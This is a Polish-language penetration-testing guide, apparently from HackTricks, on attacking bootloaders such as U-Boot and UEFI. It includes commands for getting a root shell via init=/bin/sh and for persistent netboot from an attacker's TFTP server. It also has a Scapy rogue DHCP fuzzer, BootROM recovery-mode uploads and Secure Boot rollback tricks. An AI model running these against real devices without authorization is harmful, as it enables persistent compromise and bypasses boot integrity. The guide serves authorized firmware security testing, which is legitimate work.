# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane przy modyfikowaniu konfiguracji uruchamiania urządzenia i testowaniu bootloaderów takich jak U-Boot oraz UEFI-class loaders. Skoncentruj się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisu/rollback i nadużywaniu ścieżek recovery lub netboot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot szybkie triki i nadużycie środowiska

1. Dostęp do interpreter shell
- Podczas bootu naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płyty sekwencja "magic") przed wykonaniem `bootcmd`, aby dostać się do prompta U-Boot.

2. Sprawdź stan bootu i zmienne
- Przydatne polecenia:
- `printenv` (zrzut environment)
- `bdinfo` (informacje o płycie, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody uruchamiania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Modyfikacja argumentów bootu aby uzyskać root shell
- Dopisz `init=/bin/sh`, żeby kernel uruchomił shell zamiast normalnego init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot z Twojego serwera TFTP
- Skonfiguruj sieć i pobierz kernel/fit image z LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Utrwalanie zmian przez environment
- Jeśli storage env nie jest write-protected, możesz utrwalić kontrolę:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` które wpływają na ścieżki fallback. Błędnie skonfigurowane wartości mogą umożliwić wielokrotne wejścia do shell.

6. Sprawdź debug/unsafe funkcje
- Szukaj: `bootdelay` > 0, `autoboot` wyłączone, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z nieufnego nośnika oraz kerneli/ramdisków ładowanych bez weryfikacji podpisu.

7. Testowanie obrazów U-Boot/verification
- Jeśli platforma twierdzi, że ma secure/verified boot z obrazami FIT, spróbuj zarówno unsigned jak i zmodyfikowanych obrazów:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub legacy zachowanie `verify=n` często pozwala na uruchamianie dowolnych payloadów.

## Powierzchnia netboot (DHCP/PXE) i złośliwe serwery

8. Fuzzing parametrów PXE/DHCP
- Legacy obsługa BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje odsłonięcie pamięci przez spreparowane odpowiedzi DHCP, które mogą leakować bajty z pamięci U-Boot na sieć. Przetestuj ścieżki DHCP/PXE z nadmiernie długimi/granicznymi wartościami (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszenia/leaki.
- Minimalny snippet Scapy do stresowania parametrów boot podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Sprawdź też, czy pola PXE filename są przekazywane do logiki shell/loader bez sanitizacji gdy są przekazywane do skryptów provisioning po stronie OS.

9. Testy injection komend przez rogue DHCP server
- Ustaw rogue DHCP/PXE service i próbuj wstrzykiwać znaki do pól filename lub options, aby dotrzeć do interpreterów poleceń na dalszych etapach łańcucha boot. Metasploit’s DHCP auxiliary, `dnsmasq`, lub własne skrypty Scapy sprawdzą się dobrze. Upewnij się, że izolujesz sieć laboratoryjną.

## Tryby recovery BootROM SoC, które nadpisują normalny boot

Wiele SoC udostępnia BootROM "loader" mode, który zaakceptuje kod przez USB/UART nawet jeśli obrazy na flash są nieprawidłowe. Jeśli eFuses/OTP secure-boot nie są zapalone, może to dawać dowolne wykonanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
- Przykład: `imx-usb-loader u-boot.imx` aby wypchnąć i uruchomić custom U-Boot z RAM.
- Allwinner (FEL)
- Narzędzie: `sunxi-fel`.
- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Narzędzie: `rkdeveloptool`.
- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` aby przygotować loader i przesłać custom U-Boot.

Oceń, czy urządzenie ma zapalone eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często omijają jakąkolwiek wyższą weryfikację (U-Boot, kernel, rootfs) przez wykonanie twojego pierwszego stage payloadu bezpośrednio z SRAM/DRAM.

## UEFI/bootloadery klasy PC: szybkie kontrole

10. Modyfikacje ESP i test rollback
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki z logo vendorów.
- Spróbuj bootować z downgraded lub znanymi podatnymi signed komponentami boot jeśli revocations Secure Boot (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP aby uzyskać persistence.

11. Błędy parsowania logo (klasa LogoFAIL)
- Kilka firmware OEM/IBV było podatnych na błędy parsowania obrazów w DXE, które przetwarzają boot logos. Jeśli atakujący może umieścić spreparowany obraz na ESP pod ścieżką specyficzną dla vendor (np. `\EFI\<vendor>\logo\*.bmp`) i zrestartować, wykonanie kodu w wczesnym boot może być możliwe nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczane przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.

## Ostrożność związana ze sprzętem

Bądź ostrożny przy interakcji z SPI/NAND flash podczas wczesnego boot (np. uziemianie pinów aby pominąć odczyty) i zawsze konsultuj się z datasheetem flash. Nieprawidłowo zsynchronizowane zwarcia mogą uszkodzić urządzenie lub programator.

## Notatki i dodatkowe wskazówki

- Spróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}` aby przenosić bloby environment między RAM a storage; na niektórych platformach można importować env z wymiennych nośników bez autoryzacji.
- Dla persistence na systemach Linux bootujących przez `extlinux.conf`, modyfikacja linii `APPEND` (aby wstrzyknąć `init=/bin/sh` lub `rd.break`) na partycji boot często wystarcza gdy nie ma weryfikacji podpisu.
- Jeśli userland dostarcza `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistej lokacji env storage. Błędnie skonfigurowane offsety pozwalają na czytanie/zapisywanie niewłaściwego regionu MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
